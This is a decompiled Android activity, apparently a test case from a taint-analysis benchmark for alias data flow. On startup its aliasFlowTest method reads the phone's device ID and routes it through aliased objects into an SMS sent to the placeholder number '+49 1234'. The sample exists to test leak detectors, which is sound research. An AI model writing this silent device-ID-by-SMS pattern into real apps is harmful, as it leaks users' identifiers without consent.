/*
 * Decompiled with CFR 0_124.
 * 
 * Could not load the following classes:
 *  android.app.PendingIntent
 *  android.os.Bundle
 *  android.telephony.SmsManager
 *  android.telephony.TelephonyManager
 *  android.view.LayoutInflater
 *  android.view.Menu
 *  android.view.MenuInflater
 *  android.view.MenuItem
 *  android.view.View
 *  android.view.ViewGroup
 *  java.lang.Math
 *  java.lang.Object
 *  java.lang.String
 */
package de.ecspride;

import android.app.PendingIntent;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v7.app.ActionBarActivity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

public class MainActivity
extends ActionBarActivity {
    /*
     * Enabled aggressive block sorting
     */
    private void aliasFlowTest() {
        String string2 = ((TelephonyManager)this.getSystemService("phone")).getDeviceId();
        B b = new B();
        B b2 = new B();
        A a = new A();
        A a2 = new A();
        if (Math.random() < 0.5) {
            b2 = b;
        } else {
            a = a2;
        }
        b2.attr = a;
        a2.b = string2;
        SmsManager.getDefault().sendTextMessage("+49 1234", null, b.attr.b, null, null);
    }

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.setContentView(2130903064);
        if (bundle == null) {
            this.getSupportFragmentManager().beginTransaction().add(2131034172, new PlaceholderFragment()).commit();
        }
        this.aliasFlowTest();
    }

    public boolean onCreateOptionsMenu(Menu menu2) {
        this.getMenuInflater().inflate(2131492864, menu2);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem menuItem) {
        if (menuItem.getItemId() == 2131034173) {
            return true;
        }
        return super.onOptionsItemSelected(menuItem);
    }

    class A {
        public String b;

        A() {
            this.b = "Y";
        }
    }

    public class B {
        public A attr;
    }

    public static class PlaceholderFragment
    extends Fragment {
        @Override
        public View onCreateView(LayoutInflater layoutInflater, ViewGroup viewGroup, Bundle bundle) {
            return layoutInflater.inflate(2130903065, viewGroup, false);
        }
    }

}

